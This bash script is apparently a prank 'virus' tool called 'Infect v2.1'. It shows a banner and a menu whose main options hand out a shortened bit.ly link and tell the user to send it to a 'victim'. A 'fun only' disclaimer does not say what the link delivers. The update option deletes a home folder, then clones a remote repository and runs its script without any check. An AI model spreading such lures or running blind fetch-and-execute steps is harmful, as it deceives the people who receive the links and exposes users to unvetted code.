#!/bin/bash
# Function to display the banner
banner(){
    echo -e ' \e[93m               
                         __________
                      .~#########%%;~.
                     /############%%;\
                    /######/~\/~\%%;,;,\
                   |#######\    /;;;;.,.|
                   |#########\/%;;;;;.,.|
          XX       |##/~~\####%;;;/~~\;,|       XX
        XX..X      |#|  o  \##%;/  o  |.|      X..XX
      XX.....X     |##\____/##%;\____/.,|     X.....XX
 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX
X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X
X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
echo -e '\e[92mX  \...X     @#%,.@   ----------------    @ @ 00 0 xxxxxxxxx
 X# \.X        @#%,.@   Infect v2.1      @#%,.@        
                @#%,.@              @#%,.@          
                  @#%,.@          @#%,.@            
                     @#%,.@      @#%,.@             
                       @#%.,@  @#%,.@              
                         SPY-VERSE
'
    echo " " 
    echo -e "\e[0;31m                       ▶Coded by\e[0;32m SPY\e[0;31m◀\e[0m"
    echo -e "\e[0;31m                      ⫸\e[0;33m  SPY-VERSE\e[0;31m ⫷\e[0m"
    echo 
    echo -e "\e[0;31m                    [Infect them with fun]\e[0m"
    echo " "
    echo " "
}

# Function to display the menu
menu(){
    echo "             ＞＞＞＞>>>＞ [Options] ＜<<<＜＜＜＜"
    echo " "
    echo " "
    echo "                        ➡ [1] Infect now"
    echo "                        ➡ [2] Save now"
    echo "                        ➡ [3] About"
    echo "                        ➡ [4] Update script "
    echo "                        ➡ [5] Subscribe"
    echo "                        ➡ [8] Exit"
    echo " "
    echo " "
    echo "               >＞＞＞＞＞ [SELECT] ＜＜＜＜＜<"
    echo " "
    echo -ne "#SELECT OPTION: "
    read optnz
    case $optnz in
        1) virus ;;
        2) save ;;
        3) about ;;
        4) upd ;;
        5) subscribe ;;
        8) exit 1 ;;
        *) echo "Wrong option"; exit ;;
    esac
}

# Function to simulate virus action
virus(){
    clear
    banner
    echo
    echo -e " 😈  Copy below link and send it to your victim without harming them:"
    echo
    echo -e " L1NK :- https://bit.ly/3fX8ljZ"
    echo
    echo -e " Use only for fun purpose, not for harming someone 😇✌️."
    echo
    echo -ne "#Type exit : "
    read exitz
    if [ "$exitz" = "exit" ]; then
        banner
        menu
    else
        banner
        menu
    fi
}

# Function to simulate saving action
save(){
    clear
    banner
    echo
    echo -e "  Copy below link and send it to your victim for fun:"
    echo
    echo -e " L1NK :- https://bit.ly/3fX8ljZ"
    echo
    echo -e " Use only for fun purpose, not for harming someone 😇✌️."
    echo
    echo -ne "#Type exit : "
    read exitz
    if [ "$exitz" = "exit" ]; then
        banner
        menu
    else
        banner
        menu
    fi
}

# Function to display about information
about(){
    clear
    echo -e "
         ──▐─▌──▐─▌──
         ─▐▌─▐▌
         ▐▌─▐▌─
         ─█▄▀▄██▄▀▄█─
         ──▄──██▌─▄──
         ▄▀─█▀██▀█─▀▄
         ▐▌▐▌─▐▌─▐▌▐▌
         ─▐─█────█─▌─
         ────▌──▐────

                  CALL ME SPY
             IAM FROM SINISTERS
       IM A GEEK WITH LOTS OF EXCITEMENT
             HOPE YOU LIKE THIS SCRIPT
        MY WEBSITE: https://github.com/SPY-VERSE
                BYEE.............."
    sleep 6.0
    banner
    menu
}

# Function to update the script
upd(){
    if [ -d "$HOME/infect" ]; then
        cd "$HOME" && rm -rf infect
    elif [ -d "$HOME/Infect" ]; then
        cd "$HOME" && rm -rf Infect
    else
        echo "No directory found"
        exit 1
    fi

    cd "$HOME" || exit
    sleep 1
    echo -e "         UPDATE IS GOING ON, PLEASE WAIT FOR A WHILE...!"
    echo
    printf "                     ["
    # While process is running...
    while git clone https://github.com/noob-hackers/infect 2> /dev/null; do 
        printf  "▓▓▓▓▓▓▓▓▓▓▓▓▓"
        sleep 1
    done
    printf "]"
    echo
    echo
    echo
    printf "           UPDATE SUCCESSFULL (LATEST VERSION)..!"
    sleep 2.0
    cd "$HOME/infect" || exit
    bash infect.sh
    }

# Function to simulate subscription
subscribe(){
    am start -a android.intent.action.VIEW -d https://github.com/SPY-VERSE > /dev/null 2>&1
    banner
    menu
    }

# Display the banner and start the menu
banner
menu